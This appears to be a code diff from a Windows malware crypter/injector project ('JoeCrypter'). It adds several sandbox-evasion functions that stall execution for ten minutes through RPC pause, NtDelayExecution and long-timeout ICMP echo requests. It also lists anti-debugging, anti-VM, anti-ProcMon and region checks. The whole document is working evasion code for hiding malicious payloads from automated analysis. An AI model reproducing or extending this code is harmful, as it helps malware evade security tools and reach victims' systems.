@@ -3,7 +3,13 @@
 #include <wbemidl.h>
 #include <time.h>
 #include <Objbase.h>
+#include <rpcdcep.h>
+#include <winsock2.h>
+#include <iphlpapi.h>
+#include <icmpapi.h>
 #include "joecrypt_injecter.h"
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
@@ -19,7 +25,12 @@ int AllocMem_Fornoreason(void);
 void MemSizeTrick(void);
 int LotsOfWindows(HWND);
 int FlsTrick(void);
+int timing_evasion_1(void);
+int timing_evasion_2(void);
 int timing_evasion_3(void);
+int timing_evasion_4(void);
+int timing_evasion_5(void);
+int timing_evasion_6(void);
 void PassToNoobs(void);
 char GetBeingDebugged(void);
 BOOL IsInsideVMWare(void);
@@ -36,6 +47,7 @@ void GS_Check(void);
 void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
+
 
 //const char g_szClassName[] = "JoeCrypter";
 
@@ -400,26 +412,6 @@ int FlsTrick(void)
 	{
 		// XP means no FlsAlloc() :(
 		return 1;
-	}
-}
-int timing_evasion_3(void)
-{	
-	DWORD joe_time_test1, joe_time_test2;
-	joe_time_test1 = timeGetTime();
-	Sleep(1000);
-	joe_time_test2 = timeGetTime();
-	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
-	{
-		return 0;
-	}
-	else
-	{
-		__asm
-		{
-			push 0
-			call ExitProcess
-		}
-		return 0;
 	}
 }
 
@@ -1060,3 +1052,138 @@ byte *decrypted(byte *data, int length, int crytptkey)
 	}
 	return out;
 }
+
+int timing_evasion_1(void)
+{	
+	DWORD joe_time_test1, joe_time_test2;
+	joe_time_test1 = timeGetTime();
+	Sleep(1000);
+	joe_time_test2 = timeGetTime();
+	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
+	{
+		return 0;
+	}
+	else
+	{
+		__asm
+		{
+			push 0
+			call ExitProcess
+		}
+		return 0;
+	}
+}
+
+int timing_evasion_2(void)
+{	
+I_RpcPauseExecution(600000); // ten mins
+int x = 0;
+__asm{
+mov x,edx
+}
+return x;
+}
+
+int timing_evasion_3(void)
+{	
+    HMODULE hDLL_ = LoadLibrary("ntdll.dll");
+	if(hDLL_)
+	{
+	__int64 y = -6000000000; // 600 seconds or 10 mins
+	FARPROC mydelay = GetProcAddress(hDLL_,"NtDelayExecution");
+	mydelay(FALSE,&y);
+	}
+int x = 0;
+__asm{
+mov x,ecx
+}
+return x;
+}
+
+
+
+int timing_evasion_4(void)
+{	
+	HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+    IcmpSendEcho(hIcmpFile, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
+	int x = 0;
+	__asm{
+	mov x,ebx
+		}
+	return x;
+}
+int timing_evasion_5(void)
+{	
+	HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+    IcmpSendEcho2(hIcmpFile, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
+	int x = 0;
+	__asm{
+	mov x,eax
+		}
+	return x;
+}
+int timing_evasion_6(void)
+{	
+	WSADATA wsa_Data;
+	WSAStartup(0x101,&wsa_Data);
+	char szHostName[255];
+	gethostname(szHostName, 255);
+	struct hostent *host_entry;
+	host_entry=gethostbyname(szHostName);
+	char *szLocalIP;
+	szLocalIP = inet_ntoa (*(struct in_addr *)*host_entry->h_addr_list);
+	WSACleanup();	    
+    HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	unsigned long sourceip = inet_addr(szLocalIP); // needs IP of machine for this to work.
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+   	IcmpSendEcho2Ex(hIcmpFile,NULL,NULL,NULL,sourceip,destip,SendData,sizeof(SendData),NULL,ReplyBuffer,ReplySize,600000); // 10 mins
+	int x = 0;
+	__asm{
+	mov x,ebx
+		}
+	return x;
+}
+
+/* possibly use this for verifying sleep took place. Maybe add later.
+	LASTINPUTINFO lel;
+	lel.cbSize = sizeof(LASTINPUTINFO);
+	GetLastInputInfo(&lel);
+	int timeout = 7000;
+	Sleep(timeout); // sleep method
+	DWORD lk = GetTickCount();
+	if((lk - lel.dwTime) < timeout + 1000) // 1 min
+	{
+		// looks like sleep worked.
+	}
+	else
+	{
+		// sleep function likely hooked / nulled out, fail!
+	}
+
+*/
